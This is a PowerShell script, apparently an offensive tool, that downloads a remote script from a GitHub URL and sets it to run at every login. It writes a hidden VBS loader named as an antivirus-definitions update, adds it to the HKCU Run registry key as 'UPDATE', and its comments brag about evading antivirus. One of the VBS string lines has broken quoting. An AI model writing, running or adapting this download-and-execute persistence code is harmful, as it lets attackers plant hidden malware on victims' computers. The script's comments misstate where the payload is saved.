function Add-Persistence()
{
	
	# Default saving the payload to the %TEMP% directory
	$tmpdir = $env:APPDATA
	
	iwr https://raw.githubusercontent.com/louist12/testing/main/ftp.ps1 -O $tmpdir\e.ps1
	# Change this if desired.
	$payloadvbsloaderpath = "$tmpdir\update-avdefs.vbs"

	# Create the VBS file and insert the powershell command from unicorn.
	Write-Host "[+] Creating VBS loader."
	$vbs = "Set oShell = CreateObject( ""WScript.Shell"" )`r`n"
	$vbs += "ps = "powershell $tmpdir\e.ps1"
	$vbs += "oShell.run(ps),0,true"
	$vbs | Out-File $payloadvbsloaderpath -Force
	
	# Mark the file as hidden.
	Write-Host "[+] Marking $payloadvbsloaderpath as Hidden."
	$fileObj = get-item $payloadvbsloaderpath -Force
	$fileObj.Attributes="Hidden"
	
	# Set the LOAD key. Haven't been caught by AV yet. ;-)
	Write-Host "[+] Updating registry with a LOAD key"
	Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name UPDATE -Value $payloadvbsloaderpath

	Write-Host "[+] Done!"
}

Add-Persistence
